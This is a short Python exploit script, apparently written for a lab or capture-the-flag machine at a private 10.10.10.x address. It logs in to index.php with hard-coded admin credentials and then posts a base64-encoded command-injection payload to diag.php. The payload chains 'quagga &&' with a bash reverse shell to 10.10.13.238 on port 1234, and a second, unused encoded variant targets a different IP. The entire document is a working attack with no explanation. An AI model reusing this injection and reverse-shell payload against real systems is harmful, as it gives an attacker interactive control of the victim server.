#!/usr/bin/python

import requests
import sys
import base64

url1='http://10.10.10.105/index.php'
url2='http://10.10.10.105/diag.php'
s=requests.session()
login = {"username" : "admin" , "password" : "NET_45JDX23"}
payload = base64.b64encode("quagga && bash -i >& /dev/tcp/10.10.13.238/1234 0>&1")
payload1 = "cXVhZ2dhICYmIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTMuMjIzLzEyMzQgMD4mMQ=="
s_data= { "check" : payload}
s.post(url1 , data=login)
#print q.content
s.post(url2, data=s_data)

